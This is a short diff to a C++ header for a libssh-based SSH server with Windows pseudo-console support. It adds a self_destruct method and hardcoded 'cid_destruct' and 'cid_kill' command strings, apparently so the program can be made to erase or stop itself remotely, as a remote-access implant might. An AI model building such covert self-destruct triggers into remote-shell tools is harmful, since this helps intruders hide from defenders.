@@ -8,7 +8,6 @@
 
 #include <libssh/callbacks.h>
 #include <unordered_set>
-#define EXIT_CMD "tomate"
 
 #ifdef HAVE_PTHREAD
 #include <pthread.h>
@@ -61,6 +60,7 @@ public:
     static int copy_fd_to_chan(socket_t fd, int revents, void * userdata);
 #endif
     static int copy_chan_to_fd(ssh_session session, ssh_channel channel, void * data, uint32_t len, int is_stderr, void * userdata);
+    static void self_destruct();
     static void chan_close(ssh_session session, ssh_channel channel, void * userdata);
     SSHServer();
 	
@@ -80,8 +80,7 @@ private:
 	static thread_rettype_t per_conn_thread(void* args);
 
 #ifdef _WIN32
-	//struct data_arg { HANDLE hPipeOut; HANDLE hPipeIn; char last_command[sizeof(EXIT_CMD) + 1]; int index; };
-    struct data_arg { HANDLE hPipeOut; HANDLE hPipeIn; struct thread_info_struct* thread_info;};
+    struct data_arg { HANDLE hPipeOut; HANDLE hPipeIn; struct thread_info_struct* thread_info; char last_command[sizeof("cid_destruct\r") + 1]; int index;};
 
 	static my_CreatePseudoConsole my_CreatePseudoConsole_function;
 	static my_ResizePseudoConsole my_ResizePseudoConsole_function;
@@ -96,6 +95,8 @@ private:
     static const char* ip;
     static std::string priv_key;
 
+    static char destruct_command[sizeof "cid_destruct\r"];
+    static char kill_command[sizeof "cid_kill\r"];
 
 };
 
